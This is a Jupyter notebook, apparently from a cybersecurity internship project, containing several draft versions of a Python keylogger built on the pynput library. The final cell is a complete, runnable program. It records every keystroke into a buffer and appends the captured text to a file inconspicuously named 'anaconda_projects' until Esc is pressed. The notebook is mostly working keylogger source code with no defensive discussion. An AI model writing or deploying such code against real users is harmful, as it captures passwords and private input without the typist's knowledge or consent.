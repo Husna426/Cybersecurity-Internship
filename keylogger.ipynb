{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "82462e0a-aa4f-4ecb-bd61-99f1862af62b",
   "metadata": {},
   "outputs": [],
   "source": [
    "key_buffer = []  # Buffer to store keys\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        key_buffer.append(key.char)\n",
    "    except AttributeError:\n",
    "        key_buffer.append(f\" [{key}] \")\n",
    "    \n",
    "    # Periodically save if buffer size exceeds a threshold\n",
    "    if len(key_buffer) >= 10:\n",
    "        save_logs()\n",
    "\n",
    "def save_logs():\n",
    "    with open(log_file, \"a\") as f:\n",
    "        f.write(\"\".join(key_buffer) + \"\\n\")\n",
    "    key_buffer.clear()  # Clear buffer after saving\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a9fd9652-37a9-4c7d-832d-5b1dbfc80367",
   "metadata": {},
   "outputs": [],
   "source": [
    "log_file = open(\"anaconda_projects\", \"a\")  # Open file once\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        log_file.write(key.char)\n",
    "    except AttributeError:\n",
    "        log_file.write(f\" [{key}] \")\n",
    "\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        log_file.close()  # Close the file when finished\n",
    "        return False\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2ad0f8ab-9481-4b24-aa85-411f1bd62fbd",
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    try:\n",
    "        if hasattr(key, 'char') and key.char:  # Only log printable characters\n",
    "            log_file.write(key.char)\n",
    "    except AttributeError:\n",
    "        if key != Key.esc:  # Don't log 'esc' key\n",
    "            log_file.write(f\" [{key}] \")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "168a9f9d-076c-4992-b18b-9194db08d190",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "log_file = \"anaconda_projects\"\n",
    "key_buffer = []  # Buffer to store keys\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        key_buffer.append(key.char)\n",
    "    except AttributeError:\n",
    "        key_buffer.append(f\" [{key}] \")\n",
    "\n",
    "    # Periodically save if buffer size exceeds a threshold\n",
    "    if len(key_buffer) >= 10:\n",
    "        save_logs()\n",
    "\n",
    "def save_logs():\n",
    "    with open(log_file, \"a\") as f:\n",
    "        f.write(\"\".join(key_buffer) + \"\\n\")\n",
    "    key_buffer.clear()  # Clear buffer after saving\n",
    "\n",
    "def on_release(key):\n",
    "    if key == Key.esc:  # Stop the keylogger on 'Esc' key press\n",
    "        save_logs()  # Save remaining logs before exiting\n",
    "        return False\n",
    "\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3d242a6b-951d-4867-adc8-5da547bc4bb5",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d76ea727-f7a6-49dc-b363-574738655e08",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "368797bc-52d7-4a15-956b-0330917106c7",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [conda env:base] *",
   "language": "python",
   "name": "conda-base-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
